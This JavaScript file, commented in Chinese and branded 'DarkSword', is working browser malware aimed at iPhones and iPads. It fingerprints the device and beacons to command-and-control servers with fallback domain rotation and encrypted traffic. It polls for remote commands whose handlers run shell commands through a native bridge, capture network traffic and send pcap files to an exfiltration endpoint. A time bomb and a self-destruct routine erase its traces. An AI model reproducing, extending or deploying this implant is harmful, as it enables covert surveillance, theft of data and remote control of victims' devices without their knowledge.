/**
 * beacon_enhanced.js — 增强版 Beacon 模块
 * 
 * 功能增强：
 * 1. 多 C2 容错（备用域名轮换）
 * 2. 通信加密（AES-GCM + 简化密钥交换）
 * 3. 自毁机制（异常检测后清理痕迹）
 * 4. 持久化设备 ID 备份机制
 * 5. 时间炸弹（可选过期失效）
 * 
 * 加载方式：在 beacon.js 之后加载，或替换 beacon.js
 */

(function() {
  'use strict';

  // ═══════════════════════════════════════════════════════════════════════════
  // 配置区
  // ═══════════════════════════════════════════════════════════════════════════

  // 多 C2 服务器列表（容错）
  const C2_URLS = [
    (typeof localHost !== 'undefined' ? localHost : location.origin), // 主服务器
    // 添加备用域名（部署时配置）
    // 'https://backup1.c2domain.com',
    // 'https://backup2.c2domain.com',
  ];

  let currentC2Index = 0;
  let consecutiveFailures = 0;
  const MAX_FAILURES_BEFORE_DESTRUCT = 10; // 连续失败10次后自毁

  // 时间炸弹：设置过期时间（0 表示永不过期）
  const EXPIRY_TIMESTAMP = 0; // 示例: Date.parse('2026-12-31T23:59:59Z')

  // DS_SHARED_SECRET 将在构建时通过构建脚本注入
  const SHARED_SECRET = (typeof DS_SHARED_SECRET !== 'undefined' ? DS_SHARED_SECRET : 
                         (typeof globalThis.DS_SHARED_SECRET !== 'undefined' ? globalThis.DS_SHARED_SECRET : ''));

  const CMD_POLL_MS = 8000;  // 轮询间隔

  // ═══════════════════════════════════════════════════════════════════════════
  // 设备 ID 持久化（带备份）
  // ═══════════════════════════════════════════════════════════════════════════

  function getDeviceId() {
    try {
      // 主存储：localStorage
      let id = localStorage.getItem('_ds_did');
      
      // 备份1：sessionStorage
      if (!id) id = sessionStorage.getItem('_ds_did_bak1');
      
      // 备份2：cookie
      if (!id) {
        const m = document.cookie.match(/_ds_did_bak2=([a-f0-9]{16})/);
        if (m) id = m[1];
      }
      
      // 备份3：IndexedDB（异步，这里简化为同步生成）
      if (!id) {
        id = Array.from(crypto.getRandomValues(new Uint8Array(8)))
               .map(b => b.toString(16).padStart(2, '0')).join('');
      }
      
      // 写入所有存储位置
      try { localStorage.setItem('_ds_did', id); } catch {}
      try { sessionStorage.setItem('_ds_did_bak1', id); } catch {}
      try { document.cookie = `_ds_did_bak2=${id}; max-age=31536000; path=/; SameSite=Strict`; } catch {}
      
      return id;
    } catch {
      // 完全降级：临时内存 ID
      if (!globalThis._ds_did_mem) {
        globalThis._ds_did_mem = Array.from(crypto.getRandomValues(new Uint8Array(8)))
               .map(b => b.toString(16).padStart(2, '0')).join('');
      }
      return globalThis._ds_did_mem;
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // 时间炸弹检测
  // ═══════════════════════════════════════════════════════════════════════════

  function checkExpiry() {
    if (EXPIRY_TIMESTAMP > 0 && Date.now() > EXPIRY_TIMESTAMP) {
      selfDestruct('expired');
      return false;
    }
    return true;
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // 通信加密（简化版 AES-GCM）
  // ═══════════════════════════════════════════════════════════════════════════

  let encryptionKey = null;

  // 从 SHARED_SECRET 派生 AES 密钥（简化实现）
  async function deriveKey() {
    if (!SHARED_SECRET || !crypto.subtle) return null;
    try {
      const encoder = new TextEncoder();
      const keyMaterial = await crypto.subtle.importKey(
        'raw',
        encoder.encode(SHARED_SECRET),
        { name: 'PBKDF2' },
        false,
        ['deriveBits', 'deriveKey']
      );
      const key = await crypto.subtle.deriveKey(
        {
          name: 'PBKDF2',
          salt: encoder.encode('DarkSword-Salt-v1'),
          iterations: 10000,
          hash: 'SHA-256'
        },
        keyMaterial,
        { name: 'AES-GCM', length: 256 },
        true,
        ['encrypt', 'decrypt']
      );
      return key;
    } catch {
      return null;
    }
  }

  // 加密 JSON payload
  async function encryptPayload(payload) {
    if (!encryptionKey) encryptionKey = await deriveKey();
    if (!encryptionKey) return { encrypted: false, data: JSON.stringify(payload) };

    try {
      const encoder = new TextEncoder();
      const iv = crypto.getRandomValues(new Uint8Array(12));
      const encrypted = await crypto.subtle.encrypt(
        { name: 'AES-GCM', iv },
        encryptionKey,
        encoder.encode(JSON.stringify(payload))
      );
      
      return {
        encrypted: true,
        iv: btoa(String.fromCharCode(...iv)),
        data: btoa(String.fromCharCode(...new Uint8Array(encrypted)))
      };
    } catch {
      return { encrypted: false, data: JSON.stringify(payload) };
    }
  }

  // 解密响应（服务端也需要实现对应解密）
  async function decryptPayload(encryptedData) {
    if (!encryptionKey) encryptionKey = await deriveKey();
    if (!encryptionKey || !encryptedData.encrypted) {
      return JSON.parse(encryptedData.data);
    }

    try {
      const iv = new Uint8Array(atob(encryptedData.iv).split('').map(c => c.charCodeAt(0)));
      const data = new Uint8Array(atob(encryptedData.data).split('').map(c => c.charCodeAt(0)));
      
      const decrypted = await crypto.subtle.decrypt(
        { name: 'AES-GCM', iv },
        encryptionKey,
        data
      );
      
      const decoder = new TextDecoder();
      return JSON.parse(decoder.decode(decrypted));
    } catch {
      return JSON.parse(encryptedData.data);
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // 自毁机制
  // ═══════════════════════════════════════════════════════════════════════════

  function selfDestruct(reason) {
    console.log('[DarkSword] Self-destruct triggered:', reason);
    
    try {
      // 1. 清理 localStorage
      localStorage.clear();
      
      // 2. 清理 sessionStorage
      sessionStorage.clear();
      
      // 3. 清理所有 cookie
      document.cookie.split(';').forEach(c => {
        const name = c.split('=')[0].trim();
        document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
      });
      
      // 4. 清理 IndexedDB
      if (typeof indexedDB !== 'undefined') {
        indexedDB.databases().then(dbs => {
          dbs.forEach(db => indexedDB.deleteDatabase(db.name));
        }).catch(() => {});
      }
      
      // 5. 停止轮询
      if (globalThis.pollInterval) clearInterval(globalThis.pollInterval);
      if (globalThis.heartbeatInterval) clearInterval(globalThis.heartbeatInterval);
      
      // 6. 清理全局变量
      delete globalThis.sendBeacon;
      delete globalThis.getDeviceId;
      delete globalThis._ds_did_mem;
      
      // 7. 跳转到空白页
      setTimeout(() => {
        location.replace('about:blank');
      }, 500);
    } catch (e) {
      // 静默失败
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // 上报与轮询（带多 C2 容错）
  // ═══════════════════════════════════════════════════════════════════════════

  function getCurrentC2() {
    return C2_URLS[currentC2Index];
  }

  function switchC2() {
    currentC2Index = (currentC2Index + 1) % C2_URLS.length;
    console.log('[DarkSword] Switched to C2:', getCurrentC2());
  }

  function handleFailure() {
    consecutiveFailures++;
    
    if (consecutiveFailures >= MAX_FAILURES_BEFORE_DESTRUCT) {
      selfDestruct('max_failures_reached');
      return;
    }
    
    // 每 3 次失败切换一次 C2
    if (consecutiveFailures % 3 === 0) {
      switchC2();
    }
  }

  function handleSuccess() {
    consecutiveFailures = 0;
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // Beacon 上报
  // ═══════════════════════════════════════════════════════════════════════════

  function inferDeviceName(ua) {
    const m = ua.match(/iPhone OS ([0-9_]+)/) || ua.match(/CPU OS ([0-9_]+)/);
    const ver = m ? m[1].replace(/_/g, '.') : '';
    if (/iPad/.test(ua))   return 'iPad ' + ver;
    if (/iPhone/.test(ua)) return 'iPhone ' + ver;
    return 'iOS Device ' + ver;
  }

  async function sendBeacon(opts) {
    if (!checkExpiry()) return;
    
    opts = opts || {};
    const ua = navigator.userAgent;

    const payload = {
      deviceId:   getDeviceId(),
      deviceName: inferDeviceName(ua),
      ua:         ua,
      stage:      opts.stage  || 'beacon',
      extra:      opts.extra  || {},
      model:        typeof device_model  !== 'undefined' ? device_model  : undefined,
      iosVersion:   typeof ios_version   !== 'undefined' ? ios_version.join('.') : undefined,
      execStatus:   opts.execStatus || undefined,
    };

    // 清理 undefined 字段
    Object.keys(payload).forEach(k => payload[k] === undefined && delete payload[k]);

    const BEACON_URL = getCurrentC2() + '/beacon';

    // 加密 payload（如果支持）
    const encrypted = await encryptPayload(payload);

    // 优先使用 XHR（可获取响应），降级到 sendBeacon
    try {
      const xhr = new XMLHttpRequest();
      xhr.timeout = 5000;
      xhr.open('POST', BEACON_URL, true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      if (SHARED_SECRET) xhr.setRequestHeader('Authorization', 'Bearer ' + SHARED_SECRET);
      
      xhr.onload = () => {
        if (xhr.status === 200) {
          handleSuccess();
        } else {
          handleFailure();
        }
      };
      
      xhr.onerror = xhr.ontimeout = () => {
        handleFailure();
      };
      
      xhr.send(JSON.stringify(encrypted));
      return;
    } catch {}

    // 降级：navigator.sendBeacon
    try {
      const blob = new Blob([JSON.stringify(encrypted)], { type: 'application/json' });
      if (navigator.sendBeacon && navigator.sendBeacon(BEACON_URL, blob)) {
        handleSuccess();
        return;
      }
    } catch {}
    
    handleFailure();
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // 命令轮询与执行
  // ═══════════════════════════════════════════════════════════════════════════

  const CMD_HANDLERS = {
    // ... （保留原 beacon.js 中的所有命令处理器）
    // 这里只展示新增的命令

    // 新增：自毁命令
    self_destruct() {
      return new Promise(resolve => {
        resolve('[self_destruct] 执行中...');
        setTimeout(() => selfDestruct('remote_command'), 1000);
      });
    },

    // 新增：网络嗅探（需要 native bridge 支持）
    network_sniff(args) {
      const duration = (args && args.duration) ? parseInt(args.duration) : 30;
      return new Promise(resolve => {
        try {
          if (typeof nativeNetworkSniff === 'function') {
            const pcapData = nativeNetworkSniff(duration);
            if (pcapData) {
              _exfil('file', { 
                name: 'capture_' + Date.now() + '.pcap', 
                size: Math.round(pcapData.length * 0.75), 
                content: pcapData 
              });
              return resolve('[network_sniff] 已捕获 ' + duration + ' 秒流量');
            }
          }
          resolve('[network_sniff] native bridge 未就绪或不支持');
        } catch(e) { resolve('[network_sniff] error: ' + e.message); }
      });
    },

    // 新增：进程列表
    list_processes() {
      return new Promise(resolve => {
        try {
          if (typeof nativeExecShell === 'function') {
            const out = nativeExecShell('ps aux | head -50');
            return resolve('[ps] 进程列表\n' + out);
          }
          resolve('[ps] native bridge 未就绪');
        } catch(e) { resolve('[ps] error: ' + e.message); }
      });
    },

    // 新增：杀死进程
    kill_process(args) {
      const pid = (args && args.pid) ? args.pid : '';
      return new Promise(resolve => {
        if (!pid) return resolve('[kill] 未指定 PID');
        try {
          if (typeof nativeExecShell === 'function') {
            // 参数化防止命令注入
            const pidNum = parseInt(pid);
            if (isNaN(pidNum)) return resolve('[kill] 无效 PID');
            const out = nativeExecShell(`kill -9 ${pidNum}`);
            return resolve('[kill] 已发送信号到 PID ' + pidNum + '\n' + out);
          }
          resolve('[kill] native bridge 未就绪');
        } catch(e) { resolve('[kill] error: ' + e.message); }
      });
    },

    // 新增：网络连接
    network_connections() {
      return new Promise(resolve => {
        try {
          if (typeof nativeExecShell === 'function') {
            const out = nativeExecShell('netstat -an | head -100');
            return resolve('[netstat] 网络连接\n' + out);
          }
          resolve('[netstat] native bridge 未就绪');
        } catch(e) { resolve('[netstat] error: ' + e.message); }
      });
    },
  };

  function _exfil(type, data) {
    const payload = { deviceId: getDeviceId(), type, data };
    try {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', getCurrentC2() + '/exfil', true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      if (SHARED_SECRET) xhr.setRequestHeader('Authorization', 'Bearer ' + SHARED_SECRET);
      xhr.send(JSON.stringify(payload));
    } catch {}
  }

  function reportCmdResult(cmdId, type, output, status) {
    const normalized = (output && typeof output === 'object') ? output : { output: String(output || '') };
    const payload = {
      cmdId,
      deviceId: getDeviceId(),
      type,
      output: String(normalized.output || ''),
      status: status || normalized.status || 'done',
      bridgeReady: normalized.bridgeReady,
      reason: normalized.reason,
    };
    Object.keys(payload).forEach(k => payload[k] === undefined && delete payload[k]);
    try {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', getCurrentC2() + '/cmd/result', true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      if (SHARED_SECRET) xhr.setRequestHeader('Authorization', 'Bearer ' + SHARED_SECRET);
      xhr.send(JSON.stringify(payload));
    } catch {}
  }

  async function dispatchCmd(cmd) {
    const handler = CMD_HANDLERS[cmd.type];
    if (!handler) {
      reportCmdResult(cmd.cmdId, cmd.type, '[error] 未知命令类型: ' + cmd.type, 'error');
      return;
    }
    try {
      const output = await handler(cmd.args || {});
      reportCmdResult(cmd.cmdId, cmd.type, output);
    } catch (e) {
      reportCmdResult(cmd.cmdId, cmd.type, '[error] ' + e.message, 'error');
    }
  }

  const executedCmds = new Set();
  const MAX_EXECUTED_CMDS = 10000;
  
  function pollCommands() {
    if (!checkExpiry()) return;
    
    const deviceId = getDeviceId();
    const xhr = new XMLHttpRequest();
    xhr.timeout = 5000;
    xhr.open('GET', getCurrentC2() + '/cmd/poll?deviceId=' + encodeURIComponent(deviceId), true);
    if (SHARED_SECRET) xhr.setRequestHeader('Authorization', 'Bearer ' + SHARED_SECRET);
    
    xhr.onload = function() {
      if (xhr.status !== 200) {
        handleFailure();
        return;
      }
      handleSuccess();
      try {
        const data = JSON.parse(xhr.responseText);
        (data.cmds || []).forEach(cmd => {
          if (!executedCmds.has(cmd.cmdId)) {
            executedCmds.add(cmd.cmdId);
            if (executedCmds.size > MAX_EXECUTED_CMDS) {
              const toRemove = Math.floor(MAX_EXECUTED_CMDS / 2);
              const iter = executedCmds.values();
              for (let i = 0; i < toRemove; i++) {
                const { value, done } = iter.next();
                if (done) break;
                executedCmds.delete(value);
              }
            }
            dispatchCmd(cmd);
          }
        });
      } catch {}
    };
    
    xhr.onerror = xhr.ontimeout = () => {
      handleFailure();
    };
    
    xhr.send();
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // 启动
  // ═══════════════════════════════════════════════════════════════════════════

  // 挂载到全局
  globalThis.sendBeacon = sendBeacon;
  globalThis.getDeviceId = getDeviceId;

  // 页面加载时立即上报
  sendBeacon({ stage: 'beacon' });

  // 启动轮询
  globalThis.pollInterval = setInterval(pollCommands, CMD_POLL_MS);

  // 页面可见性变化时补轮询
  document.addEventListener('visibilitychange', () => {
    if (!document.hidden) pollCommands();
  });

  // 心跳（防止被视为离线）
  globalThis.heartbeatInterval = setInterval(() => {
    sendBeacon({ stage: 'heartbeat' });
  }, 60000); // 每分钟一次心跳

})();